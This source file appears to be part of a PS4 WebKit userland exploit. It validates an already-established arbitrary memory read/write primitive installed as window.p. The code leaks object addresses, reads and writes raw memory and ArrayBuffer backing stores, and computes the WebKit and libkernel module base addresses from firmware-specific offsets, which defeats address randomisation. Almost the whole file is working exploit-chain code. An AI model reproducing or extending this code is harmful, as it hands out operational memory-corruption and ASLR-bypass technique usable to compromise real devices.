import { establishPrimitive } from "./core.js";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];
let passCount = 0;
let failCount = 0;

const params = new URLSearchParams(location.search);

function mark(tag, detail) {
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    lines.push(line);
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(l => esc(l)).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
}

function state(msg, cls) {
    stateEl.textContent = msg;
    stateEl.className = cls || "";
}

function check(name, ok, detail) {
    if (ok) {
        passCount++;
        mark("PASS", name + (detail ? "  " + detail : ""));
    } else {
        failCount++;
        mark("FAIL", name + (detail ? "  " + detail : ""));
    }
    return ok;
}

function same64(a, b) {
    return a.low === b.low && a.hi === b.hi;
}

function bufAddr(p, off, ab) {
    const cell = p.leakval(ab);
    return p.read8(p.read8(cell.add32(off.wk_ArrayBuffer_m_impl))
        .add32(off.wk_ArrayBuffer_m_contents_m_data));
}

async function run() {
    const detected = offsetsFor(navigator.userAgent);
    const offKey = params.get("fw") || "13.00";
    const { off } = offsetsForKey(offKey);
    mark("UA", navigator.userAgent);
    mark("UA-FW", detected.key || "unknown");
    mark("OFFSETS-FW", offKey + (detected.key && detected.key !== offKey
        ? " (forced; UA reports " + detected.key + ")" : ""));
    if (!off)
        throw new Error("no offset table for fw=" + offKey);
    mark("OFFSETS", off.fw_status || "loaded");

    state("establishing primitive...", "warn");

    const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
    const carrier = await establishPrimitive({
        maxAttempts: 6,
        onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : () => {})
            (t, (a != null ? "[" + a + "] " : "") + (d || ""))
    });

    const PAIR_ON = params.get("pair") === "1";
    installWindowP(carrier, {
        promote: PAIR_ON,
        onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : () => {})(t, d || "")
    });

    const p = window.p;
    if (!p) throw new Error("window.p was not installed");

    mark("PAIR-STATUS", "state=" + pairStatus.state
        + " promoted=" + pairStatus.promoted
        + " stage=" + pairStatus.stage
        + (pairStatus.failedAt ? " failedAt=" + pairStatus.failedAt : ""));

    mark("PRIMITIVE-OK", "window.p read/write/leakval live");

    const boxA = { tag: "A" };
    const boxB = { tag: "B" };
    const addrA = p.leakval(boxA);
    const addrB = p.leakval(boxB);
    check("leakval-distinct",
        !same64(addrA, addrB) && addrA.low !== 0 && addrB.low !== 0,
        "a=" + addrA + " b=" + addrB);

    const headerA = p.read8(addrA);
    p.write8(addrA, headerA);
    check("read8-write8-roundtrip-header", same64(p.read8(addrA), headerA), "");

    const probe = new ArrayBuffer(0x20);
    const view = new Uint32Array(probe);
    view[0] = 0xdeadbeef;
    view[1] = 0xcafebabe;

    if (off) {
        const dataPtr = bufAddr(p, off, probe);
        check("arraybuffer-data-plausible", dataPtr.hi > 0, "ptr=" + dataPtr);
        check("arraybuffer-read4",
            p.read4(dataPtr).low === 0xdeadbeef,
            "got=" + p.read4(dataPtr));
        p.write4(dataPtr, new int64(0x13371337, 0));
        check("arraybuffer-write4",
            view[0] === 0x13371337,
            "view[0]=" + view[0].toString(16));
        view[0] = 0xdeadbeef;
    }

    if (off.wk_expm1_builtin) {
        const fnCell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(fnCell.add32(0x18))
            .add32(off.wk_JSFunction_m_function));
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        const libkernelBase = errorFn.sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
        check("module-bases-0x4000-aligned",
            aligned(webkitBase) && aligned(libkernelBase), "");
    }

    const summary = passCount + " pass, " + failCount + " fail";
    if (failCount === 0) {
        state("userland primitive OK — " + summary, "ok");
        mark("DONE", summary);
    } else {
        state("failures — " + summary, "bad");
        mark("DONE", summary);
    }
}

run().catch(err => {
    state("error: " + err.message, "bad");
    mark("ERROR", err.stack || err.message);
});
